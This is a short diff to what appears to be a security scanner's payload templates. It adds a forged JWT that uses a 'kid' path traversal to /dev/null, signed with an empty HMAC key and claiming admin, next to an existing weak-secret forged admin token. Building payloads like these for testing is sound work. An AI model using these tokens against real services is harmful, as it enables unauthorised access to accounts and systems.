@@ -180,6 +180,15 @@ _TEMPLATES: dict[str, str] = {
     "jwt_forgery/weak-secret": (
         "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.GdYrDf_hp3IHBhv_b91SSCh7N2Lp19bHJXciDzy8C_c"
     ),
+    # kid path-traversal: header carries a `kid` pointing at a file a verifier
+    # naive enough to resolve `kid` as a filesystem path would read as the
+    # signing key. `/dev/null` reads as zero bytes on any POSIX target, so the
+    # signature is a real HMAC-SHA256 over `header.payload` computed with the
+    # empty-string key — verifiable independently of this project's own code.
+    "jwt_forgery/kid-injection": (
+        "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0"
+        ".eyJzdWIiOiJhZG1pbiJ9.GCCD4VHjHRm9OiOwtJmeADoUFCH4NvnOs0OQc9wzePI"
+    ),
     # Blind OOB shapes — {nonce}/{collab} are the existing per-fire correlators
     # (mint_fire_kit provides them); confirmation is the OOB_CALLBACK oracle
     # (probe_nonce in observed_nonces). Literal braces survive targeted
